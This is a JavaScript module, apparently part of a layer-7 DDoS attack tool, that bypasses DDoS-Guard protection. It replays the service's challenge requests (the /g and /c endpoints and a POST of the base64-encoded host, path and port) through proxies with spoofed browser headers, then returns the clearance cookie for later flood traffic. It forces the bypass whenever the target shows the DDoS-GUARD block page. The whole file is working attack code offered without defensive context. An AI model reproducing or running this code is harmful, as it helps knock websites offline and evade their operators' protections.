module.exports = function DDoSGuard() {
    const request = require('request'),
        cloudscraper = require('cloudscraper');

    function encode(string) {
        return Buffer.from(string).toString('base64');
    }

    var hS, uS, pS;
    hS = encode(l7.parsed.protocol + '//' + l7.parsed.host);
    uS = encode(l7.parsed.path);
    pS = encode(l7.parsed.port || '');

    function bypass(proxy, uagent, callback, force, cookie) {
        if (!cookie) {
            cookie = '';
        }
        if (['5sec', 'free'].indexOf(l7.firewall[1]) !== -1 || force) {
            cloudscraper.get({
                url: l7.parsed.protocol + '//ddgu.ddos-guard.net/g',
                gzip: true,
                proxy: proxy,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept': 'application/json',
                    'Content-type': 'application/json; charset=utf-8', 
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': "1",
                    'Referer': l7.target,
                    'Origin': l7.parsed.protocol + '//' + l7.parsed.host
                }
            }, (err, res, body) => {
                if (err || !res || !body) {
                    return false;
                }

                cloudscraper.get({
                    url: l7.parsed.protocol + '//ddgu.ddos-guard.net/c',
                    gzip: true,
                    proxy: proxy,
                    headers: {
                        'Connection': 'Keep-Alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': 1,
                        'User-Agent': uagent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Accept': 'application/json',
                        'Content-type': 'application/json; charset=utf-8', 
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': "1",
                        'Referer': l7.parsed.protocol + '//' + l7.parsed.host + '/',
                        'Origin': l7.parsed.protocol + '//' + l7.parsed.host + '/',
                    }
                }, (err, res, body) => {
                    if (err || !res || !body) {
                        return false;
                    }

                    cloudscraper.post({
                        url: l7.parsed.protocol + '//ddgu.ddos-guard.net/ddgu/',
                        gzip: true,
                        proxy: proxy,
                        jar: true,
                        followAllRedirects: true,
                        headers: {
                            'Connection': 'Keep-Alive',
                            'Cache-Control': 'max-age=0',
                            'Upgrade-Insecure-Requests': 1,
                            'User-Agent': uagent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept': 'application/json',
                            'Content-type': 'application/json; charset=utf-8', 
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-User': '?1',
                            'Upgrade-Insecure-Requests': "1",
                            "Referer": l7.parsed.protocol + '//' + l7.parsed.host + '/',
                            'Origin': l7.parsed.protocol + '//' + l7.parsed.host + '/',
                        },
                        form: {
                            u: uS,
                            h: hS,
                            p: pS
                        }
                    }, (err, res, body) => {
                        if (err || !res || !body) {
                            return false;
                        }
                        callback(res.request.headers.cookie);
                    });
                });
            });
        } else {
            cloudscraper.get({
                url: l7.target,
                gzip: true,
                proxy: proxy,
                jar: true,
                followAllRedirects: true,
                headers: {
                    'Connection': 'Keep-Alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': uagent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Accept': 'application/json',
                    'Content-type': 'application/json; charset=utf-8', 
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': "1",
                    "Referer": l7.parsed.protocol + '//' + l7.parsed.host + '/',
                    'Origin': l7.parsed.protocol + '//' + l7.parsed.host + '/',
                }
            }, (err, res, body) => {
                if (err || !res || !body) {
                    return false;
                }
                if (res.request.headers.cookie) {
                    callback(res.request.headers.cookie);
                } else {
                    if (res.statusCode == 403 && body.indexOf("<title>DDOS-GUARD</title>") !== -1) {
                        return bypass(proxy, uagent, callback, true);
                    } else {
                        return false;
                    }
                }
            });
        }
    }

    return bypass;
}